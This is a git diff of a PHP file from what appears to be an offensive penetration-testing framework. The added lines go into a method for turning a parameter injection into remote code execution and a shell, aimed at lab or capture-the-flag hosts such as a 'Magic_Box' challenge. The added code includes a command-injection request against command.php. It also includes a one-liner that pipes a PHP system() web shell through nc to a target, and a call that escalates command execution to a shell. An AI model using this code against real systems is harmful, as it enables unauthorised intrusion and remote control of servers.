@@ -248,8 +248,56 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
             $this->notify("END XSS");
     }
 
-    public function poc4web2shell8param2rce(){ // No
+    public function poc4web2shell8param2rce(){ // 
         $this->ssTitre(__FUNCTION__);
+        $this->flag_poc = TRUE ;
+        //$this->flag_poc = FALSE ;
+        
+        
+        $ip = "10.60.10.181";
+        $port = 33447 ;
+
+        $uri = "Challenge/Magic_Box/command.php?IP=10.60.10.1&submit=submit";
+        $param = "IP";
+        $value = "10.60.10.1&submit=submit";
+        
+        $methode_http = "POST";
+        $url = "http://$ip:$port/$uri";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $OS = "linux";
+        
+        
+        
+
+        $url_ce = new PARAM($eth,$domain,$url,$param,$value,$methode_http);
+        $url_ce->poc($this->flag_poc);
+        $url_ce->ce2shell8param($OS);
+        
+        exit();
+        $ip = "192.168.2.120";
+        $port = 80 ;
+
+        $uri = "logs/backup_log.php?cmd=pwd";
+
+        $methode_http = "GET";
+        $url = "http://$ip:$port/$uri";
+        $eth = $this->ip4eth4target($ip);
+        $domain = "hack.vlan";
+        $OS = "linux";
+        
+        
+        $query = "(echo '<?php system(\$_GET[cmd]) ?>';sleep 1;) | nc $ip 10001  ";
+        //$this->requette($query);
+        $this->pause();
+        $url_ce = new PARAM($eth,$domain,$url,"cmd","pwd",$methode_http);
+        $url_ce->poc($this->flag_poc);
+        $url_ce->ce2shell8param($OS);
+        
+        
+        
+        
+        exit();
         $owasp = "10.60.10.130";
         $this->start("Web Vulnerabilities", "");
         $this->flag_poc = TRUE ;
